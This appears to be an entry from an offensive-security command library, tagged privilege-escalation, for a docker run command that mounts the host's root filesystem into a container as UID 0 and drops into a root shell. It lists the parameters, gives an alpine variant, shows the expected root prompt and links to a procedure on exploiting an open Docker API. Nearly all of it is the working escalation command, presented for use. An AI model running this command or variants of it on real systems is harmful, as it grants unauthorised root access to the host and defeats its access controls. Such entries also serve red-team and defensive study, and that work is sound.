---
type: command
executor: bash
data: 'docker run --name temp_container --rm -i -v /:/mnt -u 0 -t ubuntu bash'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - docker
  - privilege-escalation
verified: true
validated: true
---

# docker-run-privileged-ubuntu-container

## Command

```bash
docker run --name temp_container --rm -i -v /:/mnt -u 0 -t ubuntu bash
```

## Description

Creates and runs a temporary privileged Ubuntu container, mounting the host's root filesystem at /mnt and providing an interactive root shell for host access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --name temp_container | Name for the container | No |
| --rm | Auto-remove on exit | No |
| -i -t | Interactive terminal | Yes |
| -v /:/mnt | Mount host root to /mnt | Yes |
| -u 0 | Run as root (UID 0) | Yes |
| ubuntu | Image to use | Yes |
| bash | Entry command | Yes |

## Examples

### Basic Usage

```bash
docker run --name temp_container --rm -i -v /:/mnt -u 0 -t ubuntu bash
```

### Advanced Usage

```bash
docker run --name explorer --rm -i -v /:/host -u 0 -t alpine sh
```

## Expected Output

Interactive bash prompt inside the container: `root@temp_container:/#`. Navigate to /mnt for host files.

## Related

- [[procedures/Exploit-Open-Docker-API-for-Container-Management]]
- [[tools/Docker]]
